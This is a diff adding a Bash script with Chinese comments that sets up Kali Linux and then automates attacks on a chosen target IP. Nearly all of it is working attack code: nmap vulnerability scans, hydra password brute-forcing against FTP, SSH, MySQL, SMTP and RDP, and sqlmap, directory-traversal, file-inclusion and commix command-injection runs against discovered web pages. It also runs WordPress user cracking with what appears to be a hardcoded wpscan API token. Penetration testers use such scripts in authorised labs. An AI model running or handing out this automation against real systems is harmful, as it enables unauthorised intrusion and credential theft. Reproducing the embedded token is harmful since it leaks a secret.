@@ -1,0 +1,396 @@
+#!/bin/bash
+#set -x
+
+# 打印脚本标题
+print_title() {
+    echo '╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗'
+    echo '║                                                                                                                      ║' 
+    echo '║                                          █████      ███                       █████████                              ║'
+    echo '║                                         ░░███      ░░░                       ███░░░░░███                             ║'
+    echo '║  ████████    ██████  ████████  █████ ████░███████  ████   ██████  ████████  ░███    ░░░   ██████  ██████  ████████   ║'
+    echo '║ ░░███░░███  ███░░███░░███░░███░░███ ░███ ░███░░███░░███  ░░░░░███░░███░░███ ░░█████████  ███░░███░░░░░███░░███░░███  ║'
+    echo '║  ░███ ░███ ░███████  ░███ ░░░  ░███ ░███ ░███ ░███ ░███   ███████ ░███ ░███  ░░░░ ░░░███░███ ░░░  ███████ ░███ ░███  ║'
+    echo '║  ░███ ░███ ░███░░░   ░███      ░███ ░███ ░███ ░███ ░███  ███░░███ ░███ ░███  ███    ░███░███  ██████░░███ ░███ ░███  ║'
+    echo '║  ████ █████░░██████  █████     ░░████████████████  █████░░████████████ █████░░█████████ ░░██████░░████████████ █████ ║'
+    echo '║ ░░░░ ░░░░░  ░░░░░░  ░░░░░       ░░░░░░░░░░░░░░░░  ░░░░░  ░░░░░░░░░░░░ ░░░░░  ░░░░░░░░░   ░░░░░░  ░░░░░░░░░░░░ ░░░░░  ║'
+    echo '║                                                                                                                      ║' 
+    echo '╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣'
+}
+
+# 打印消息
+print_message() {
+    echo "║ $1"
+}
+
+# 权限检查
+check_permissions() {
+    if [ "$(id -u)" != "0" ]; then
+        print_message "----当前脚本没有以 sudo 执行, 请用sudo或root用户执行当前脚本  -------------------------------------------------------------"
+        echo '╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'
+        exit 1
+    else
+        print_message "----------------< 当前脚本以 sudo 执行 >----------------------------------------------------------------------------"
+    fi
+}
+
+# 帮助信息
+HELP_MESSAGE() {
+    print_message "---------------------< 帮助信息 >-----------------------------------------------------------------------------------" 
+    print_message "# 使用方法1: kali初始化设置"
+    print_message "sudo sh NerubianScan.sh first"    
+    print_message "# 使用方法2: 渗透测试主动侦察"
+    print_message "sudo sh NerubianScan.sh <eth0> <target ip/netmask> <scan log dir>"
+    print_message "-- \$1: eth0"
+    print_message "-- \$2: target ip/netmask"
+    print_message "-- \$3: scan log dir"
+    echo '╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'
+}
+
+# 检查是否为 IP 地址
+is_ip() {
+    ip=$1
+    set -- $(echo "$ip" | tr '.' ' ')
+    if [ $# -ne 4 ]; then
+        return 1
+    fi
+    for part in "$@"; do
+        if ! expr "$part" : '[0-9]\+$' > /dev/null || [ "$part" -lt 0 ] || [ "$part" -gt 255 ]; then
+            return 1
+        fi
+    done
+    return 0
+}
+
+# 检查是否为网段
+is_network() {
+    network=$1
+    set -- $(echo "$network" | tr '/' ' ')
+    if [ $# -ne 2 ]; then
+        return 1
+    fi
+    ip="$1"
+    mask="$2"
+    if ! is_ip "$ip" || ! expr "$mask" : '[0-9]\+$' > /dev/null || [ "$mask" -lt 0 ] || [ "$mask" -gt 32 ]; then
+        return 1
+    fi
+    return 0
+}
+
+# 检查是否为 CIDR 表示法
+is_cidr() {
+    if echo "$1" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$'; then
+        IFS='/' read -r ip prefix <<< "$1"
+        IFS=. read -r i1 i2 i3 i4 <<< "$ip"
+        if [[ $i1 -ge 0 && $i1 -le 255 && $i2 -ge 0 && $i2 -le 255 && $i3 -ge 0 && $i3 -le 255 && $i4 -ge 0 && $i4 -le 255 && $prefix -ge 0 && $prefix -le 32 ]]; then
+            return 0
+        fi
+    fi
+    return 1
+}
+
+# 检查是否为子网掩码表示法
+is_subnet_mask() {
+    if echo "$1" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3} ([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
+        IFS=' ' read -r ip mask <<< "$1"
+        IFS=. read -r i1 i2 i3 i4 <<< "$ip"
+        IFS=. read -r m1 m2 m3 m4 <<< "$mask"
+        if [[ $i1 -ge 0 && $i1 -le 255 && $i2 -ge 0 && $i2 -le 255 && $i3 -ge 0 && $i3 -le 255 && $i4 -ge 0 && $i4 -le 255 &&
+              $m1 -ge 0 && $m1 -le 255 && $m2 -ge 0 && $m2 -le 255 && $m3 -ge 0 && $m3 -le 255 && $m4 -ge 0 && $m4 -le 255 ]]; then
+            return 0
+        fi
+    fi
+    return 1
+}
+
+# 检查是否为范围表示法
+is_range() {
+    if echo "$1" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3} - ([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
+        IFS=' - ' read -r start end <<< "$1"
+        IFS=. read -r s1 s2 s3 s4 <<< "$start"
+        IFS=. read -r e1 e2 e3 e4 <<< "$end"
+        if [[ $s1 -ge 0 && $s1 -le 255 && $s2 -ge 0 && $s2 -le 255 && $s3 -ge 0 && $s3 -le 255 && $s4 -ge 0 && $s4 -le 255 &&
+              $e1 -ge 0 && $e1 -le 255 && $e2 -ge 0 && $e2 -le 255 && $e3 -ge 0 && $e3 -le 255 && $e4 -ge 0 && $e4 -le 255 ]]; then
+            return 0
+        fi
+    fi
+    return 1
+}
+
+# 提取开放端口
+extract_open_ports() {
+    service=$1
+    if [ -f "$3/nmapscan_2_detail" ]; then
+    grep open "$3"/nmapscan_2_detail|grep '/tcp'|grep -i "$service"|grep -v Warning|awk '{print $1}'|awk -F/ '{print $1}' > "$3"/."$service"_port.txt
+else
+    echo "Error: nmapscan_2_detail file not found in $3"
+    exit 1
+fi
+}
+
+# 执行弱口令爆破
+run_bruteforce() {
+    service=$1
+    username_list=$2
+    password_list=$3
+    scan_dir=$4  # 新增变量存储扫描结果目录
+    while read -r port; do
+            print_message "---------------------< The hydra for $service >-------------------------------------------------------------------------"
+        print_message "hydra -L "$username_list" -P "$password_list" -s $port $selected_ip "$service" -t 4 -w 30 -f"
+        hydra -L "$username_list" -P "$password_list" -s $port $selected_ip "$service" -t 4 -w 30 -f
+    done < "$scan_dir"/."$service"_port.txt  # 使用 $scan_dir 拼接端口文件路径
+}
+
+# 主函数
+main() {
+    print_title
+    check_permissions
+
+    if [ "$1" = "-h" ] || [ "$1" = "--help" ] || [ "$1" = "" ]; then
+        HELP_MESSAGE
+        exit 0
+    elif [ "$1" = "first" ]; then
+        # 修改镜像源
+        KALI_ORG_NU=$(grep -v "kali.org" /etc/apt/sources.list|grep -c ^deb)
+        if [ "$KALI_ORG_NU" -eq 0 ]; then
+            cat << EOF > /etc/apt/sources.list
+deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
+deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
+deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+EOF
+            print_message "----------------< /etc/apt/sources.list  >-----------------------------------------------------------------"
+        fi
+
+        # 镜像源外网测试
+        if ! apt -y install vim > /dev/null 2>&1 ; then
+            print_message "----------------< 镜像源网络异常，请修复网络后重试 >-------------------------------------------------------"
+            exit 1
+        fi
+
+        # 安装必备工具【离线】
+        tools=("gobuster" "enum4linux" "whatweb" "wpscan" "nmap" "showmount" "medusa" "smtp-user-enum" "smbclient" "smbmap" "nikto" "dirsearch" "ipcalc")
+        for tool in "${tools[@]}"; do
+            if apt install -y $tool > /dev/null 2>&1; then
+                print_message "# $tool installed successfully "
+            else
+                print_message "# $tool installation failed "
+            fi
+        done
+
+        # 字典安装与解压
+        [ -e "/usr/share/wordlists/rockyou.txt" ] || gunzip /usr/share/wordlists/rockyou.txt.gz
+        apt install seclists -y
+
+        print_message "# Kali Linux first setup execution completed"
+        echo '╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'
+        exit 0
+    fi
+
+    if is_ip "$2"; then
+        print_message "# \$2输入的是有效的IP地址"
+    elif is_network "$2"; then
+        print_message "# \$2输入的是有效的网段"
+    else
+        print_message "# 没有扫描到合法的IP地址或网段参数，请检查修正后重试"
+        print_message "# \$2:$2"
+        HELP_MESSAGE
+        exit 1
+    fi
+
+    if is_cidr "$2" || is_subnet_mask "$2" || is_range "$2"; then
+        print_message "# \$2参数是合法的 IPv4 网段表示法:$2"
+        ip_local=$(ip a |grep "$(echo "$2" | awk -F'.' '{print $1"."$2"."$3}')"| awk '{print $2}'| awk -F/ '{print $1}')
+        print_message "----------------< \$2合法,开始主机发现 >--------------------------------------------------------------------"
+        while true
+        do
+            print_message "fping -agq $2"
+            nmap_result=$(fping -agq "$2")
+            echo "$nmap_result" > .ip_list.txt
+            ip_list_wc=$(wc -l .ip_list.txt|awk '{print $1}')
+            if [ "$ip_list_wc" -eq 0 ]; then
+                print_message "ERROR! 没有扫描到合法IP地址，退出"
+                echo '╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'
+                exit 2
+            fi
+            print_message "当前网卡$1对应的IP为: $ip_local"
+            print_message " PS：输入任意字母将重新执行IP扫描, 输入其他字符将导致脚本错误"    
+            print_message " 序号   IP地址"
+            echo "     0    退出当前脚本"
+            cat -n .ip_list.txt
+            read -rp "║ 请输入序号: " selected_index
+            if [[ "$selected_index" =~ [a-zA-Z] ]]; then
+                print_message "ERROR! 你输入的值[$selected_index]包含字母，将重新执行IP扫描"
+                print_message '--------------------------------------------------------------------------------------------------------------------'
+            elif [ "$selected_index" -eq 0 ]; then
+                print_message "EXIT! 你输入的值为 0 ,退出脚本"
+                echo '╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'
+                exit 1
+            elif ! [[ "$selected_index" =~ ^[0-9]+$ ]]; then
+                print_message "ERROR! 你输入的值[$selected_index]不是整数，请重新输入。"
+                print_message '--------------------------------------------------------------------------------------------------------------------'   
+            elif [ "$selected_index" -gt "$ip_list_wc" ] || [ "$selected_index" -lt "1" ];then
+                print_message "ERROR! 你输入的值[$selected_index]不是一个介于 1 至 $ip_list_wc 之间的整数，请重新输入。"
+                print_message '--------------------------------------------------------------------------------------------------------------------'
+            else
+                selected_ip=$(head -n "$selected_index" .ip_list.txt | tail -n 1)
+                if [ "$selected_ip" = "$ip_local" ]; then
+                    print_message "你选择的IP是：$selected_ip 是本机IP，请重新选择"
+                else
+                    print_message "你选择的IP是：$selected_ip ，开始执行扫描指令"
+                    break
+                fi
+            fi
+        done
+    else
+        selected_ip="$2"
+        ip_local=$(ip a |grep "$(echo "$selected_ip" | awk -F'.' '{print $1"."$2"."$3}')"| awk '{print $2}'| awk -F/ '{print $1}')
+        if [ "$selected_ip" = "$ip_local" ]; then
+            print_message "你输入的IP是：$selected_ip 是本机IP，请重新输入合法的目标IP。"
+            exit 1
+        fi
+        print_message "你输入的IP是：$selected_ip ，开始执行扫描指令"
+    fi
+
+    print_message "----------------< Creating a Storage Catalog >----------------------------------------------------------------------"
+    rm -rf "$3"
+    if ! su kali -c "mkdir -p $3"; then
+        print_message "ERROR! 无法创建存储目录 $3"
+        echo '╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'
+        exit 1
+    fi
+    ls "$3"
+    print_message "# \$3:$3"
+
+    # 二、nmap扫描
+    print_message '--------------------------------------------------------------------------------------------------------------------'
+    print_message "---------------------< IP testing >---------------------------------------------------------------------------------"
+    if ping -c 1 "$selected_ip" > /dev/null 2>&1; then
+        print_message "# OK！IP is alive"
+    else
+        print_message "# ERROR! IP is not alive"
+        echo '╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'
+        exit 1
+    fi
+
+    print_message "---------------------< The nmap ports scanning >------------------------------------------------------------------------"
+
+    # nmap扫描文件保留级别
+    # -oN/-oX/-oS/-oG/-oA <file>
+    Log_output_format="N"
+
+    # NO.1
+    print_message "---------------------< The nmap NO.1 scanning >-------------------------------------------------------------------------"
+    print_message "sudo nmap -sS --min-rate 5000 -p 0-65535 $selected_ip -o$Log_output_format $3/nmapscan_1_ports"
+    nmap -sS -Pn --min-rate 5000 -p 0-65535 "$selected_ip" -o"$Log_output_format" "$3"/nmapscan_1_ports
+    NmapPorts=$(grep open "$3"/nmapscan_1_ports*|awk -F'/' '{print $1}'|paste -sd ',')
+
+    # NO.2
+    print_message "---------------------< The nmap NO.2 scanning >-------------------------------------------------------------------------"
+    print_message "sudo nmap -sS -sV -sC -O -p$NmapPorts $selected_ip -o$Log_output_format $3/nmapscan_2_detail"
+    nmap -sS -sV -sC -AO -Pn --min-rate 5000 -p "$NmapPorts" "$selected_ip" -o"$Log_output_format" "$3"/nmapscan_2_detail
+
+    # NO.3
+    print_message "---------------------< The nmap NO.3 scanning >-------------------------------------------------------------------------"
+    print_message "sudo nmap -sU --top-ports 20  $selected_ip -o$Log_output_format $3/nmapscan_3_udp"
+    nmap -sU --top-ports 20 -Pn "$selected_ip" -o"$Log_output_format" "$3"/nmapscan_3_udp
+
+    # NO.4
+    print_message "---------------------< The nmap NO.4 scanning >-------------------------------------------------------------------------"
+    print_message "sudo nmap -sV --script=vuln,auth -p $NmapPorts $selected_ip -o$Log_output_format $3/nmapscan_4_script"
+    nmap -sV --script=vuln,auth -Pn -p "$NmapPorts" "$selected_ip" -o"$Log_output_format" "$3"/nmapscan_4_script
+
+    # 服务测试
+    services=("ftp" "ssh" "http" "mysql" "smtp" "rdp")
+    for service in "${services[@]}"; do
+        extract_open_ports "$service" "" "$3"
+        case "$service" in
+            "ftp")
+                while read -r i; do
+                    if [ "$i" -ne 0 ]; then
+                        if [ $(grep -i 'ftp-anon' "$3"/nmapscan_2_detail*|grep 'FTP code 230'|wc -l) -eq 1 ]; then
+                            mkdir -p "$3"/ftp_download
+                            wget -r -nH --cut-dirs=5 -P "$3"/ftp_download/ ftp://anonymous@$selected_ip
+                        fi
+                    fi
+                done < "$3"/."$service"_port.txt
+                run_bruteforce "ftp" "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" "/usr/share/wordlists/metasploit/unix_passwords.txt" "$3"
+                ;;
+            "ssh")
+                run_bruteforce "ssh" "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" "/usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt" "$3"
+                ;;
+            "http")
+                while read -r i; do
+                    if [ `wc -l "$3"/."$service"_port.txt|awk '{print $1}'` -ne 0 ]; then
+                        # 技术栈扫描
+                        print_message "-------------< web technology stack scanning >------------------------------------------------------------------------"
+                        print_message "whatweb http://$selected_ip:$i --log-verbose=$3/whatweb_$i.log "
+                        whatweb "http://$selected_ip:$i" --log-verbose="$3"/whatweb_"$i".log
+                        
+                        # 技术栈扫描
+                        print_message "-------------< web nikto scanning >-----------------------------------------------------------------------------------"
+                        print_message "nikto -h \"http://$selected_ip:$i\" -output $3/nikto_$i.txt"
+                        nikto -h "http://$selected_ip:$i" -output "$3"/nikto_"$i".txt
+                        
+                        # 目录扫描
+                        print_message "----------------< web directory scanning 1 >--------------------------------------------------------------------------"
+                        print_message "feroxbuster -u \"http://$selected_ip:$i\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200 301 302 -o \"$3\"/feroxbuster_out_\"$i\".log"
+                        feroxbuster -u "http://$selected_ip:$i" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200 301 302 -o "$3"/feroxbuster_out_"$i".log
+                        #feroxbuster --url "http://$selected_ip:$i" --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302 -o "$3"/feroxbuster_out_"$i".log
+                                                # 检索curl网页的HTTP标头
+                                                curl -Iv http://homelab.hmv
+
+
+                        # 根据扫描结果进行筛选
+                        grep ^200 $3/feroxbuster_out_$i.log|grep php|awk '{print $6}' > "$3"/.feroxbuster.txt
+                        while read -r url; do
+                            if [ `wc -l "$3"/.feroxbuster.txt|awk '{print $1}'`  -ne 0 ]; then
+                                # SQL注入漏洞测试
+                                print_message "---------------------< SQL注入漏洞测试 >-------------------------------------------------------------------------------"
+                                print_message "sqlmap -u $url --batch --output-dir=$3 --log-file=sqlmap_$url.log"
+                                sqlmap -u $url --batch --output-dir="$3" --log-file=sqlmap_"$url".log
+                                
+                                # 目录遍历测试
+                                print_message "---------------------< 目录遍历测试 >-------------------------------------------------------------------------------"
+                                print_message "dotdotpwn -m http -h $url?file=../../../../../../../../etc/passwd -X -r $3/FileInclusion_$url.log"
+                                dotdotpwn -m http -h $url?file=../../../../../../../../etc/passwd -X -r $3/FileInclusion_"$url".log
+    
+                                # 文件包含漏洞测试
+                                print_message "---------------------< 文件包含漏洞测试 >-------------------------------------------------------------------------------"
+                                print_message "ffuf -c -w /usr/share/wordlists/dirb/common.txt \"$url?file=FUZZ\" -o \"$3\"/ffuf_\"$url\".log"
+                                ffuf -c -w /usr/share/wordlists/dirb/common.txt "$url?file=FUZZ" -o "$3"/ffuf_"$url".log
+                                
+                                # 命令注入漏洞测试
+                                print_message "---------------------< 命令注入漏洞测试 >-------------------------------------------------------------------------------"
+                                print_message "commix -u $url?id=1 --all --batch > $3/CommandInjection_$url.log"
+                                commix -u $url?id=1 --all --batch --output-dir="$3"/CommandInjection_"$url".log
+                            fi
+                        done < "$3"/.feroxbuster.txt
+    
+                        ## wordpress扫描
+                        if [ "$(grep -ic wordpress "$3"/nmapscan_2_detail*)" -ne 0 ]; then
+                            # 扫描用户名并尝试破解
+                            print_message "------------< 扫描wordpress用户名并尝试破解 >-------------------------------------------------------------------------"
+                            wpscan --api-token vkd34m0eKZcO3Cpa4NekrsSyQpHicgxGm7JEY4GL8CE --url "http://$selected_ip:$i" -e u --wordlist /usr/share/wordlists/metasploit/password.lst
+                            # 常用目录扫描
+                            print_message "----------------< wordpress常用目录扫描 >----------------------------------------------------------------------------"
+                        fi
+                    fi
+                done < "$3"/."$service"_port.txt
+                ;;
+            "mysql")
+                run_bruteforce "mysql" "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" "/usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt" "$3"
+                ;;
+            "smtp")
+                run_bruteforce "smtp" "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" "/usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt" "$3"
+                ;;
+            "rdp")
+                run_bruteforce "rdp" "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" "/usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt" "$3"
+                ;;
+        esac
+    done
+
+    echo '╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'
+}
+
+# 调用主函数
+main "$@"                                                                                                                                                            
